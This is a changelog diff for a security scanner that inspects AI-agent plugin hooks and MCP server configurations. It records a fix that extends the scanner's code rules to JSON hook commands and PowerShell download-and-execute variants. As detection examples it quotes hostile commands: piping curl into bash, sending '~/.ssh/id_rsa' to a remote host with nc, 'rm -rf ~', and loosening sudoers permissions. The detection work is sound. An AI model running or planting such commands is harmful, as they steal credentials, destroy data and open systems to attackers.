@@ -545,6 +545,14 @@ version bump.
   whole count for the send rules. Read and sent is critical in a script or a code block (high in prose); read
   in a script is `de-read-sensitive-files`; a mention in prose, or `mkdir`/`chmod` of the directory, is
   neither.
+- **`scan_skill` never read the commands a plugin's configuration runs as code** (older than 3.0.0). A `.json` file
+  is not code: a hook's `curl … | bash` was caught only by the prose rule that reads every line of a text file,
+  and the code rules with no prose twin were never met — a SessionStart hook running `cat ~/.ssh/id_rsa | nc
+  host 443`, `rm -rf ~` or `sudo chmod 777 /etc/sudoers` read nothing. The `command` (and string `args`) of
+  every hook and MCP server in a
+  `hooks.json`, `plugin.json`, `.mcp.json` / `mcp.json` or `.claude/settings*.json` now go through the code rules
+  at full severity, reported at the line of the `command`. Measured on the 101 such files in the installed
+  plugins: no finding; dev-guardian's own `hooks.json`, `plugin.json` and `.mcp.json`: none.
 - **A download held in a PowerShell variable reached `iex` in every spelling but one.** `$s = irm …; iex $s` was
   denied; `Set-Variable -Name s -Value (irm …)`, `New-Variable s (irm …)`, `$script:s = …`, `${s} = …`, a copy
   through a string (`$b = "$a"`), `irm … -OutVariable s`, `| Tee-Object -Variable s` and a read back through
